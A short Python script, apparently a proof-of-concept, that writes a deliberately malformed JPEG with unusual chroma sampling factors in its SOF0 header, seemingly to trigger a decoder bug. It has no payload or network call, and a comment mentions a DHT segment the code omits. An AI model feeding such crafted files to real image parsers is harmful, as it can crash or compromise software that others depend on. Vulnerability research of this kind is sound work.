from pathlib import Path
p=Path('/workspace/poc.jpg')
# minimal crafted JPEG-like bytes with fractional sampling factors in SOF0
b=bytearray()
b += b'\xff\xd8'  # SOI
# APP0
b += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
# DQT minimal
b += b'\xff\xdb\x00\x43\x00' + bytes([0]*64)
# SOF0: 3 components, component 1 has H=3,V=2; others H=1,V=1
b += b'\xff\xc0'
seg = bytearray()
seg += b'\x00\x11'  # length 17
seg += b'\x08'      # precision
seg += b'\x00\x10\x00\x10'  # height,width
seg += b'\x03'      # components
seg += b'\x01\x32\x00'  # Y: H=3,V=2
seg += b'\x02\x11\x00'  # Cb
seg += b'\x03\x11\x00'  # Cr
b += seg
# DHT minimal placeholder and SOS to keep parser moving; file likely malformed but enough for candidate
b += b'\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
b += b'\x00' * 16
b += b'\xff\xd9'
p.write_bytes(b)
print('wrote', p, len(b))
